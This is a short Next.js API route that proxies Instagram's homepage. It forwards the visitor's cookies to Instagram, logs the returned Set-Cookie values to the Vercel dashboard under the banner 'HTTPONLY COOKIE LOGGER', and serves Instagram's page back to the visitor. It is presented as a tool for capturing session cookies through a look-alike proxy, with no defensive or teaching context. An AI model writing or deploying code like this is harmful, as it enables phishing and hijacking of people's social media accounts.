// pages/api/proxy.js

export default async function handler(req, res) {
  try {
    // 1. Fetch Instagram from the server side
    const response = await fetch('https://www.instagram.com/', {
      headers: {
        'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Cookie': req.headers['cookie'] || '',
      },
    });

    // 2. Extract HttpOnly Cookies from the response headers
    const cookies = response.headers.getSetCookie().join('; ');

    // 3. Log to Vercel Dashboard
    console.log('======================');
    console.log('🍪 HTTPONLY COOKIE LOGGER');
    console.log('📅 Time:', new Date().toISOString());
    console.log('🍪 HttpOnly Cookies:', cookies);
    console.log('======================');

    // 4. Send the Instagram HTML to the user
    // We must send the body as a string or buffer
    const html = await response.text();

    res.status(200).type('text/html').send(html);
  } catch (error) {
    console.error('Proxy Error:', error);
    res.status(500).json({ error: 'Internal Server Error' });
  }
}
